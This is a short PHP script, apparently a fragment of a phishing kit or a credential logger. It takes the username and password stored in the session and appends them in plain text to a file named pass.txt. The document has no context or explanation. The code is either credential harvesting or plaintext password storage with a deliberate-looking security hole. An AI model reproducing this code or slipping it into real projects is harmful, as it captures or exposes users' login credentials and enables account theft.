<?php



   $user=$_SESSION["username"];;
   $pass=$_SESSION['password'];

	$filePath = "pass.txt";
    $f = fopen($filePath, "a");
    fwrite($f, $user. " " .$pass ."\n");

    fclose($f);

?>